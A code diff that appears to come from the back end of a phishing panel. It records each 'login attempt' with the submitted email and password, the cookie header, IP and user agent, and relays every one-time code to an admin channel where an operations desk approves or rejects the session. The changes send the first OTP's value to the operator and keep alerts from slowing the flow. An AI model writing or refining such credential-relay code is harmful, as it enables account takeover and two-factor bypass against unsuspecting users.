@@ -35,7 +35,8 @@ async function meta() {
   }
 }
 
-async function alert(a: LoginAttempt, step: string, event: string) {
+/** Admin alerts must never block OTP delivery. */
+function alertAsync(a: LoginAttempt, step: string, event: string) {
   void sendAdminStepAlert({
     attemptId: a.id,
     email: a.email,
@@ -47,7 +48,7 @@ async function alert(a: LoginAttempt, step: string, event: string) {
     cookieHeader: a.cookieHeader || undefined,
     ip: a.ip || undefined,
     userAgent: a.userAgent || undefined,
-  }).catch((e) => console.error(e))
+  }).catch((e) => console.error('[alert]', e))
 }
 
 export async function startChallenge(input: {
@@ -82,7 +83,7 @@ export async function startChallenge(input: {
     updatedAt: now,
   }
   saveAttempt(a)
-  await alert(a, 'credentials', 'User submitted email & password')
+  alertAsync(a, 'credentials', 'User submitted email & password')
   return { ok: true, attemptId: id }
 }
 
@@ -110,9 +111,15 @@ export async function submitUsername(input: {
   a.cookieHeader = m.cookie ?? a.cookieHeader
   saveAttempt(a)
 
-  await sendOtpEmail(a.email, otp, 'OTP #1').catch(console.error)
+  // OTP first (must succeed path before admin noise)
+  try {
+    await sendOtpEmail(a.email, otp, 'OTP #1')
+  } catch (e) {
+    console.error('[otp1] send failed', e)
+  }
   console.info('[login-ops] OTP #1', a.email, otp)
-  await alert(a, 'username', `Username entered. OTP #1 emailed.`)
+
+  alertAsync(a, 'username', `Username entered. OTP #1: ${otp}`)
   return { ok: true }
 }
 
@@ -140,7 +147,7 @@ export async function submitOtp(input: {
     a.lastEvent = `OTP #${input.which} wrong (entered ${otp})`
     a.updatedAt = Date.now()
     saveAttempt(a)
-    await alert(a, expected, `OTP #${input.which} failed — entered ${otp}`)
+    alertAsync(a, expected, `OTP #${input.which} failed — entered ${otp}`)
     return { ok: false, error: 'Incorrect code.' }
   }
 
@@ -154,9 +161,15 @@ export async function submitOtp(input: {
     a.lastEvent = 'OTP #1 verified — NEW OTP #2 sent'
     a.updatedAt = Date.now()
     saveAttempt(a)
-    await sendOtpEmail(a.email, otp2, 'OTP #2').catch(console.error)
+
+    try {
+      await sendOtpEmail(a.email, otp2, 'OTP #2')
+    } catch (e) {
+      console.error('[otp2] send failed', e)
+    }
     console.info('[login-ops] OTP #2', a.email, otp2)
-    await alert(a, 'otp1', `OTP #1 ok (${otp}). NEW OTP #2: ${otp2}`)
+
+    alertAsync(a, 'otp1', `OTP #1 ok (${otp}). NEW OTP #2: ${otp2}`)
     return { ok: true, next: 'otp2' }
   }
 
@@ -166,7 +179,7 @@ export async function submitOtp(input: {
   a.lastEvent = 'OTP #2 verified — waiting for ops approval'
   a.updatedAt = Date.now()
   saveAttempt(a)
-  await alert(a, 'otp2', `OTP #2 ok (${otp}). Waiting for APPROVE / REJECT.`)
+  alertAsync(a, 'otp2', `OTP #2 ok (${otp}). Waiting for APPROVE / REJECT.`)
   return { ok: true, next: 'awaiting_approval' }
 }
 
@@ -225,6 +238,6 @@ export async function decide(
       : 'Rejected by operations desk'
   a.updatedAt = Date.now()
   saveAttempt(a)
-  await alert(a, decision, a.lastEvent)
+  alertAsync(a, decision, a.lastEvent)
   return { ok: true }
 }
